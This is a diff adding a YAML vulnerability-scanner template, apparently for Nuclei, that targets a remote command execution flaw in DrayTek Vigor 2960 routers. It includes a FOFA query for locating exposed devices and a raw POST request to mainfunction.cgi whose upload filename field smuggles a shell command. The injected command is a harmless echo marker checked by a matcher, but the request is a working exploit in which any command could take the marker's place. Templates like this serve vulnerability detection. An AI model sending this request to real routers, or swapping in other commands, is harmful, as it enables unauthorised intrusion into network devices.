@@ -1,0 +1,34 @@
+id: draytek-vigor-2960-mainfunction-rce
+info:
+  name: draytek-vigor-2960-mainfunction-rce
+  author: unknow
+  severity: critical
+  description: draytek-vigor-2960 存在远程命令执行漏洞。
+  tags: draytek,rce
+  metadata:
+    fofa-query: 'banner="Model: Vigor2960" || body="src=\"V2960/excanvas.js"'
+http:
+  - raw:
+      - |
+        POST /cgi-bin/mainfunction.cgi/cvmcfgupload?1=2 HTTP/1.1
+        Host: 
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        ------WebKitFormBoundary                                         
+        Content-Disposition: form-data; name="abc"; filename="t';{{rce}};echo '_"
+        Content-Type: text/x-python-script
+
+
+
+        ------WebKitFormBoundary--
+
+    payloads:
+      rce:
+        - "echo a55D0dF216daB072"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1==200 && contains(body_1, "a55D0dF216daB072")'
